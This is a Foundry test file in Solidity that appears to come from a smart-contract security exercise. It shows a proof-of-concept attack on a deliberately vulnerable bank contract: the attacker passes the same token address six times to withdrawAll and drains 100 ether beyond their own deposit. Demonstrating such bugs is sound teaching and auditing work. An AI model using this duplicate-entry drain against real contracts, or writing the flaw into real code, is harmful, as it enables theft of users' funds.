// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test, console2} from "../../lib/forge-std/src/Test.sol";
import {ERC20Mock} from "../../lib/openzeppelin-contracts/contracts/mocks/ERC20Mock.sol";
import {VulnerableMultiTokenBank} from "../../src/array-duplicates/array-duplicates.sol";

contract TestDuplicates is Test {
    VulnerableMultiTokenBank public vulnerableBank;
    ERC20Mock public weth;

    address public attacker = makeAddr("attacker");

    function setUp() public {
        weth = new ERC20Mock();

        address[] memory tokens = new address[](1);
        tokens[0] = address(weth);

        vulnerableBank = new VulnerableMultiTokenBank(tokens);
        weth.mint(address(vulnerableBank), 100 ether);

        weth.mint(attacker, 20 ether);
    }

    function testWithdrawAllDuplicates() public {
        uint256 vulnerableBankBalanceBefore = weth.balanceOf(address(vulnerableBank));
        uint256 attackerBalanceBefore = weth.balanceOf(attacker);

        // deposit
        vm.startPrank(attacker);
        address[] memory tokensToDeposit = new address[](1);
        tokensToDeposit[0] = address(weth);
        uint256[] memory amountsToDeposit = new uint256[](1);
        amountsToDeposit[0] = 20 ether;
        weth.approve(address(vulnerableBank), 20 ether);
        vulnerableBank.deposit(amountsToDeposit, tokensToDeposit);

        // withdraw
        address[] memory tokensToWithdraw = new address[](6);
        tokensToWithdraw[0] = address(weth);
        tokensToWithdraw[1] = address(weth);
        tokensToWithdraw[2] = address(weth);
        tokensToWithdraw[3] = address(weth);
        tokensToWithdraw[4] = address(weth);
        tokensToWithdraw[5] = address(weth);
        vulnerableBank.withdrawAll(tokensToWithdraw);

        // assert attacker was able to steal 100 ether and get his 20 ether back
        assertEq(weth.balanceOf(attacker), 120 ether);
        vm.stopPrank();

        console2.log("VulnerableBank WETH balance before: ", vulnerableBankBalanceBefore);
        console2.log("Attacker WETH balance before:       ", attackerBalanceBefore);
        console2.log("VulnerableBank WETH balance after:  ", weth.balanceOf(address(vulnerableBank)));
        console2.log("Attacker WETH balance after:        ", weth.balanceOf(attacker));
    }
}
